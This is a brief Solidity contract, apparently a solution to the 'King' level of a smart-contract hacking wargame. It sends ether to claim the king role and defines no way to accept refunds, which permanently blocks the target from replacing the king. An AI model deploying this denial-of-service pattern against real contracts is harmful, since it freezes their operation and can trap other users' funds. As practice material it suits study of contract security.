// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingFacker {
    constructor(address payable kingAddress) payable {
        (bool success, ) = kingAddress.call{value: msg.value}("");
        require(success, "Failed to become king");
    }
}